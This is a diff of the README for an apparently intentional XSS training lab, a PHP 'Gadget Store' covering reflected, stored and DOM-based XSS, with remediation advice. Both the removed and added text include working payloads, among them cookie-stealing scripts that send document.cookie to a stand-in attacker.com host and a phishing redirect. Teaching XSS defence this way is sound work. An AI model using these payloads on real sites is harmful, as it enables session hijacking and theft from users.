@@ -1,15 +1,6 @@
-# Reflected XSS Demo Lab - Gadget Store
+# XSS Demo Lab - Gadget Store
 
-This lab demonstrates practical **Reflected Cross-Site Scripting (XSS)** attacks, including session hijacking.
-
-## Project Structure
-- `db.php`: SQLite database initialization.
-- `login.php`: User authentication.
-- `index.php`: Store homepage with product search.
-- `search.php`: Search results (Vulnerable Point A).
-- `profile.php`: User profile (Vulnerable Point B).
-- `logout.php`: Session termination.
-- `database.db`: SQLite database file.
+This lab is designed to demonstrate Reflected, Stored, and DOM-based Cross-Site Scripting (XSS).
 
 ## Lab Setup
 Run the built-in PHP server:
@@ -21,59 +12,36 @@ php -S localhost:8000
 - **Admin**: `admin` / `admin123`
 - **User**: `victim` / `password123`
 
+## How to use the Lab (Toggle Fixes)
+Each vulnerable file contains a **VULNERABLE** section and a commented-out **FIX** section. 
+To test the fix:
+1.  Locate the `<!-- VULNERABLE -->` block in the code.
+2.  Comment it out.
+3.  Uncomment the `<!-- FIX: ... -->` block.
+
 ## Attack Scenarios
 
-### 1. Basic Reflected XSS (Visual Evidence)
-- **Vulnerable URL**: `http://localhost:8000/search.php?query=`
-- **Payload**: `<script>alert('XSS')</script>`
-- **Explanation**: The search term is directly reflected into the `<h2>` tag in `search.php`.
+### 1. Reflected XSS
+- **File**: `search.php` (Search results) and `profile.php` (Success messages).
+- **Payload**: `http://localhost:8000/search.php?query=<script>alert('Reflected')</script>`
+- **Nature**: Input from the URL is reflected directly in the HTML response.
 
-### 2. Session Hijacking (The "Practical" Attack)
-This attack aims to steal the `PHPSESSID` cookie.
+### 2. Stored XSS (Persistent)
+- **File**: `product.php` (Customer Reviews).
+- **Scenario**: Post a malicious comment. It is saved to the database and executed for everyone who views the page.
+- **Payload**: Post a review with `<script>alert('Stored XSS')</script>`.
+- **Practical Attack**: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`
 
-- **Vulnerable URL**: `http://localhost:8000/profile.php?msg=`
-- **Scenario**: An attacker sends a link to a logged-in victim.
-- **Payload (Conceptual)**:
-  ```html
-  <script>document.location='http://attacker.com/steal?cookie=' + document.cookie</script>
-  ```
-- **Local Simulation**:
-  ```html
-  <script>alert('Stealing Cookie: ' + document.cookie)</script>
-  ```
-- **Execution**: Log in as `victim`, then navigate to:
-  `http://localhost:8000/profile.php?msg=<script>alert('Cookie: '+document.cookie)</script>`
+### 3. DOM-based XSS
+- **File**: `product.php` (Welcome message script).
+- **Scenario**: The script uses `innerHTML` to write data from the URL fragment (`#name=`) to the page.
+- **Payload**: `http://localhost:8000/product.php?id=1#name=<img src=x onerror=alert('DOM_XSS')>`
+- **Nature**: The vulnerability is entirely in the client-side JavaScript.
 
-### 3. DOM Redirection
-- **Payload**: `<script>window.location='https://malicious-site.com'</script>`
-- **Explanation**: Redirects the user to a phishing page.
+## Remediation Summary
 
-## Remediation
-
-### Code-Level Fix (PHP)
-Use `htmlspecialchars()` to encode special characters.
-
-**Before (Vulnerable):**
-```php
-<h2>Search results for: <?php echo $query; ?></h2>
-```
-
-**After (Secure):**
-```php
-<h2>Search results for: <?php echo htmlspecialchars($query, ENT_QUOTES, 'UTF-8'); ?></h2>
-```
-
-### Server-Level Fix
-Set the `HttpOnly` flag on cookies to prevent JavaScript from accessing them.
-
-**PHP Configuration:**
-```php
-session_start([
-    'cookie_httponly' => true,
-    'cookie_secure' => true, // Use with HTTPS
-    'cookie_samesite' => 'Strict',
-]);
-```
+- **Reflected & Stored**: Always use `htmlspecialchars($data, ENT_QUOTES, 'UTF-8')` when echoing user input in PHP.
+- **DOM-based**: Use safe sinks like `textContent` instead of `innerHTML` when handling user-controlled data in JavaScript.
+- **Session Security**: Use the `HttpOnly` flag on cookies to prevent theft via XSS.
 
 ---
-**Disclaimer**: For educational use only.
